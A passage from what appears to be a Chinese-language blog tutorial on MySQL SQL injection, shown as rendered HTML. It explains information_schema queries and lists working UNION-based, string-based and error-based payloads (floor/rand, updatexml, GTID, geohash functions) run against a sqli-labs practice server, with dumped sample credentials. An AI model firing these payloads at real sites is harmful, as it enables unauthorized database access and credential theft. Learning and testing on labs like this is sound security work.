data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png\" alt=\"image-20220305142445896\"></p>\n<h3 id=\"3sql注入基础\"><a class=\"markdownIt-Anchor\" href=\"#3sql注入基础\">#</a> 3.SQL 注入基础</h3>\n<h4 id=\"31sql前置知识\"><a class=\"markdownIt-Anchor\" href=\"#31sql前置知识\">#</a> 3.1SQL 前置知识</h4>\n<p>1.mysql 查询方式</p>\n<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>\n<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>\n<p>desc information_schema.schemata;</p>\n<p>select distinct schema_name from schemata;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png\" alt=\"image-20220213191251636\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png\" alt=\"image-20220213191345456\"></p>\n<p><code>COLUMNS</code>  表：给出了表中的列信息</p>\n<p>desc information_schema.columns;</p>\n<p>select distinct column_name from information_schema.columns</p>\n<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>\n<p>desc information_schema.tables;</p>\n<p>select distinct table_name from information_schema.tables;</p>\n<p><strong>即可以使用的查询语句为</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class=\"line\"></span><br><span class=\"line\">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class=\"line\"></span><br><span class=\"line\">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class=\"line\"></span><br><span class=\"line\">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>\n<p>2.mysql 函数</p>\n<p>常用的 mysql 函数有：</p>\n<p><code>user()</code>  用户名</p>\n<p><code>database()</code>  数据库名</p>\n<p><code>version()</code>  mysql 数据库版本</p>\n<p><code>load_file()</code>  mysql 读取本地文件的函数</p>\n<p><code>@@datadir</code>   数据库路径</p>\n<p>3.sql 常用注释</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png\" alt=\"image-20220213193633629\"></p>\n<h4 id=\"32sql注入定义\"><a class=\"markdownIt-Anchor\" href=\"#32sql注入定义\">#</a> 3.2SQL 注入定义</h4>\n<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>本质因为输入的数据和代码不进行区分</p>\n<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>\n<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>\n<p>常见的包括：</p>\n<p>Get 参数触发 SQL 注入</p>\n<p>POST 参数触发 SQL 注入</p>\n<p>Cookie 触发 SQL 注入</p>\n<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>\n<p>两个条件</p>\n<p>用户能够控制输入</p>\n<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>\n<h4 id=\"32mysql注入分类\"><a class=\"markdownIt-Anchor\" href=\"#32mysql注入分类\">#</a> 3.2mysql 注入分类</h4>\n<p>1. 按照请求方法注入</p>\n<p>​\tget 型注入</p>\n<p>​\tpost 型注入</p>\n<p>2. 按照 SQL 数据类型分类</p>\n<p>​\t整形注入</p>\n<p>​\t字符型注入</p>\n<p>3. 其他类型数据类型</p>\n<p>​\t报错注入</p>\n<p>​\t双注入</p>\n<p>​\t布尔盲注</p>\n<p>​\t时间盲注</p>\n<p>​\tCookie 注入</p>\n<p>​\tUser-Agent 注入</p>\n<p><strong>手工注入过程</strong></p>\n<p>1 判断是否存在注入点；</p>\n<p>2 判断字段长度（字段数）；</p>\n<p>3 判断字段回显位置；</p>\n<p>4 判断数据库信息；</p>\n<p>5 查找数据库名；</p>\n<p>6 查找数据库表；</p>\n<p>7 查找数据库表中所有字段以及字段值；</p>\n<p>8 猜解账号密码；</p>\n<p>9 登录管理员后台。</p>\n<h5 id=\"万能密码\"><a class=\"markdownIt-Anchor\" href=\"#万能密码\">#</a> 万能密码</h5>\n<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>\n<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>\n<h5 id=\"整形注入\"><a class=\"markdownIt-Anchor\" href=\"#整形注入\">#</a> 整形注入</h5>\n<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class=\"line\">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class=\"line\">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class=\"line\">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class=\"line\">information_schema 包含当前数据库表名</span><br><span class=\"line\">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class=\"line\">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class=\"line\">因此需要判断前一个表有几列</span><br><span class=\"line\">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class=\"line\">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class=\"line\">这里的1,2,3只是用于占位</span><br><span class=\"line\">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class=\"line\">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class=\"line\">寻找数据库名字</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class=\"line\">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class=\"line\">查询当前数据库</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class=\"line\">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\">查询表有哪些字段</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">查询用户名密码</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class=\"line\">以human_read输出user_name和password</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>\n<p>2. 什么类型注入</p>\n<p>3. 语句是否能够被恶意修改 — 第二要素</p>\n<p>4. 是否能够成功执行 — 第三要素</p>\n<p>5. 获取想要数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class=\"line\">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class=\"line\">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class=\"line\">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class=\"line\">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>order by 探测列名原理：</strong></p>\n<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>\n<h5 id=\"字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#字符型注入\">#</a> 字符型注入</h5>\n<p>和数字型区别：接收的参数是否有’’ ,id='<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">id&#x27;字符型，id=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>id 数字型</p>\n<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用order by判断列数</span><br><span class=\"line\">?id=1&#x27; order by 3 --+</span><br><span class=\"line\">2.使用联合查询</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:root@localhost</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">3.查找数据库中有几张表</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">提示超出一行</span><br><span class=\"line\">可以使用limit 0,1，此时报出第一张表名</span><br><span class=\"line\">或者使用group_concat</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找列名</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:id,username,password</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找password</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class=\"line\">Your Password:security</span><br></pre></td></tr></table></figure>\n<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>\n<p>字符型：select * from table where username=‘test’</p>\n<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>\n<p>查询内容为字符串时：select * from table where username = ‘test’</p>\n<p>测试：</p>\n<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>\n<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>\n<h5 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h5>\n<p>查询错误会输出相应的错误，查询正确没有对应输出</p>\n<h6 id=\"1st_latfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#1st_latfromgeohashmysql57x\">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>\n<p>计算纬度 hash 报错</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>\n<h6 id=\"2st_longfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#2st_longfromgeohashmysql57x\">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>\n<p>payload</p>\n<p>#同 8 ，都使用了嵌套查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"3gtid-mysql-56x-显错200\"><a class=\"markdownIt-Anchor\" href=\"#3gtid-mysql-56x-显错200\">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>\n<p>0x01 GTID</p>\n<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>\n<h6 id=\"gtid_subset-和-gtid_subtract函数\"><a class=\"markdownIt-Anchor\" href=\"#gtid_subset-和-gtid_subtract函数\">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>\n<p>0X02 函数详解</p>\n<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>\n<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>\n GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>\n<p>0x03 注入过程 (payload)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GTID_SUBSET函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class=\"line\"> </span><br><span class=\"line\">GTID_SUBTRACT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>函数都是那样，只是适用的版本不同</p>\n<h6 id=\"4floor8xmysql50\"><a class=\"markdownIt-Anchor\" href=\"#4floor8xmysql50\">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>\n<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>\n<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>\n<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png\" alt=\"img\"></p>\n<p>2.floor（rand（0）*2）函数</p>\n<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>\n<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>\n<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png\" alt=\"img\"></p>\n<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>\n<p>3.group by 函数</p>\n<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>\n<p>4.count（*）函数</p>\n<p>count（*）统计结果的记录数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png\" alt=\"img\"></p>\n<p>5. 综合使用产生报错：</p>\n<p>select count(*),floor(rand(0)*2) x from users group by x;</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png\" alt=\"img\"></a></p>\n<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>\n<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>\n<p><strong>三、报错分析</strong></p>\n<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>\n首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>\n然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。</strong></p>\n<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>\n<p>（1）查询前默认会建立空虚拟表如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png\" alt=\"img\"></a></p>\n<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png\" alt=\"img\"></a></p>\n<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png\" alt=\"img\"></a></p>\n<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png\" alt=\"img\"></a></p>\n<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png\" alt=\"img\"></a></p>\n<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png\" alt=\"img\"></a></p>\n<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>\n<p><a href=\"\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png\" alt=\"img\"></a></p>\n<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>\n<p><strong>四、总结</strong></p>\n<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>\n<p>payload:</p>\n<p>#获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>\n<h6 id=\"5st_pointfromgeohash-mysql57\"><a class=\"markdownIt-Anchor\" href=\"#5st_pointfromgeohash-mysql57\">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>\n<p>获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取字段里面的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-updatexml\"><a class=\"markdownIt-Anchor\" href=\"#6-updatexml\">#</a> 6 updatexml</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class=\"line\">updatexml(目标文档,xpath路径,更新内容)</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class=\"line\">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class=\"line\">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class=\"line\">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>\n<h6 id=\"7-extractvalue\"><a class=\"markdownIt-Anchor\" href=\"#7-extractvalue\">#</a> 7 extractvalue</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span 